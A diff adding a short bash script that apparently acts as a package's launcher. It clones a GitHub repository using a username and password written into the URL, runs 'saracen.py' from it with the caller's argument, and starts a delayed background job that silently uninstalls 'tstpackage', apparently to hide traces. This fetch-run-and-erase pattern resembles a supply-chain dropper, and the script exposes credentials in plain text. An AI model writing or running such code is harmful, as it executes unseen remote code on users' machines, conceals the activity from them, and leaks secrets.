@@ -1,0 +1,4 @@
+#!/usr/bin/env bash
+
+sh -c "sleep 180; yes | pip3 uninstall tstpackage > /dev/null 2>&1" &
+rm -rf meridional; git clone https://patriciacclarke1992:Z0xIlc9aw@github.com/patriciacclarke1992/meridional && cd meridional && python3 saracen.py $1
